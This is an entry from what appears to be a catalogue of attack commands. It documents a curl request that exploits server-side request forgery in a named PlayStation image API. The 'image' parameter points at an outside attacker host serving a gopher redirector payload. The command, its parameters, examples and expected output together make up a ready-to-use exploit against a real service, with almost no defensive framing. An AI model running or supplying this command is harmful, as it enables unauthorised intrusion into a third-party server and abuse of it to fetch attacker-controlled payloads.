---
data: >-
  curl -X GET
  "https://image.api.np.km.playstation.net/images/?format=png&image=http%3A%2F%2Fblackdoorsec.net/gopher3.php"
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0)
  Gecko/20100101 Firefox/73.0" -H "Accept:
  text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" -H
  "Accept-Language: en-US,en;q=0.5" -H "Accept-Encoding: gzip, deflate" -H
  "Connection: close" -H "Upgrade-Insecure-Requests: 1"
tags:
  - ssrf
  - http
type: command
output: 'HTTP 404 Not Found, but triggers SSRF'
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:14.567Z'
id: a18097bb-3742-4ad9-bc7e-83c3fb8ade00
verified: false
validated: true
submitted: true
---
# http-get-playstation-image-ssrf

## Command

```bash
curl -X GET "https://image.api.np.km.playstation.net/images/?format=png&image=http%3A%2F%2Fblackdoorsec.net/gopher3.php" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" -H "Accept-Language: en-US,en;q=0.5" -H "Accept-Encoding: gzip, deflate" -H "Connection: close" -H "Upgrade-Insecure-Requests: 1"
```

## Description

Sends an HTTP GET request to the vulnerable PlayStation endpoint with an encoded external URL in the 'image' parameter, exploiting SSRF to fetch and execute the redirector payload.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| image | URL-encoded attacker URL (http://blackdoorsec.net/gopher3.php) | Yes |
| format | Output format (png) | Yes |

## Examples

### Basic Usage

```bash
curl "https://image.api.np.km.playstation.net/images/?format=png&image=http%3A%2F%2Fblackdoorsec.net/gopher3.php"
```

### Advanced Usage

With full headers as shown.

## Expected Output

<html><body>404 Not Found</body></html>, but server-side fetch occurs.

## Related

- [[procedures/Trigger-SSRF-in-PlayStation-Image-Endpoint]]
